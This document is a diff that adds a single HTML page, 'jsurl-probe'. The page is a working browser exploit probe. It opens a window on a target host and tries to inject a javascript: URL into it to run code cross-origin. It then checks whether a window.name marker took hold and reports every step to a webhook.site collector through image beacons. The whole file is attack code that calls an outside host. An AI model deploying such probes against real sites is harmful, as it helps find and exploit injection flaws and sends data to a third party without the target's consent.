@@ -1,0 +1,33 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>jsurl-probe</title>
+<script>
+const q = new URLSearchParams(location.search);
+const host = q.get('host') || 'https://3.38.205.243';
+function beacon(kind, extra='') {
+  new Image().src = 'https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/' + kind + '?host=' + encodeURIComponent(host) + '&extra=' + encodeURIComponent(extra) + '&t=' + Date.now();
+}
+let w;
+try {
+  w = window.open(host + '/', '_blank');
+  beacon('jsopen', String(!!w));
+} catch (e) {
+  beacon('jsopenerr', e && e.message ? e.message : 'err');
+}
+setTimeout(() => {
+  try {
+    w.location = "javascript:window.name='JSPROBE';void 0";
+    beacon('jsset', 'ok');
+  } catch (e) {
+    beacon('jsseterr', e && e.message ? e.message : 'err');
+  }
+}, 3000);
+setTimeout(() => {
+  try {
+    beacon('jsname', w ? String(w.name) : 'no-window');
+  } catch (e) {
+    beacon('jsnameerr', e && e.message ? e.message : 'err');
+  }
+}, 7000);
+</script>
+OK
